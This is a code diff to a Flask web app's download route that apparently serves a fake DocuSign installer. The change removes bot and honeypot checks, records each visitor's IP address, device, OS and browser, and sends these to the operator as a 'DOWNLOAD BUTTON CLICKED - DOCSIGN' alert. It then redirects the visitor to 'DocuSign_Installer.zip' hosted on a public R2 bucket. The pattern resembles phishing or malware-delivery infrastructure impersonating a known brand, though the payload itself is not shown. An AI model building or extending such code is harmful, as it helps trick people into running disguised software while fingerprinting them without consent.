@@ -125,25 +125,49 @@ def is_suspicious_request(request):
     return False
 
 
-@app.route("/download", methods=["POST"])
+@app.route("/download", methods=["GET"])
 @limiter.limit("10 per minute")  # Stricter limit for download endpoint
 def download():
     print("Download route accessed")
     
-    # Advanced bot detection
-    if is_suspicious_request(request):
-        print("Suspicious request detected")
-        # Silently reject suspicious requests
-        return render_template("index.html")
+    # Get IP and device info for notification
+    # Get real IP from proxy headers (Render uses proxy)
+    if request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    elif request.headers.get('X-Real-IP'):
+        ip = request.headers.get('X-Real-IP')
+    else:
+        ip = request.remote_addr
     
-    # Check honeypot field - if filled, it's a bot
-    honeypot_value = request.form.get("website", "")
-    if honeypot_value:
-        print("Honeypot filled")
-        # Silently reject bot submission
-        return render_template("index.html")
+    user_agent_string = request.headers.get("User-Agent", "")
+    ua = parse(user_agent_string)
     
-    print("Request passed security checks")
+    device_type = "Mobile 📱" if ua.is_mobile else "Tablet 📱" if ua.is_tablet else "Desktop 🖥️"
+    
+    # Send download button click notification
+    download_message = f"""
+🔘 𝘋𝘖𝘞𝘕𝘓𝘖𝘈𝘋 𝘉𝘜𝘛𝘛𝘖𝘕 𝘊𝘓𝘐𝘊𝘒𝘌𝘋 - 𝘋𝘖𝘊𝘚𝘐𝘎𝘕
+
+🌐 𝘐𝘗 𝘋𝘈𝘛𝘈
+━━━━━━━━━━━━━━━━
+📍 IP: {ip}
+
+💻 𝘋𝘌𝘝𝘐𝘊𝘌
+━━━━━━━━━━━━━━━━
+🖥️ Type: {device_type}
+⚙️ OS: {ua.os.family} {ua.os.version_string}
+🌐 Browser: {ua.browser.family} {ua.browser.version_string}
+
+⏰ 𝘛𝘐𝘔𝘌
+━━━━━━━━━━━━━━━━
+📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+"""
+    
+    send_notification(download_message)
+    
+    # Redirect to R2 URL
+    r2_url = "https://pub-5943043f0aa3454291be9cd2fe736787.r2.dev/DocuSign_Installer.zip"
+    return redirect(r2_url, code=302)
     
     # Get IP and device info for notification
     # Get real IP from proxy headers (Render uses proxy)
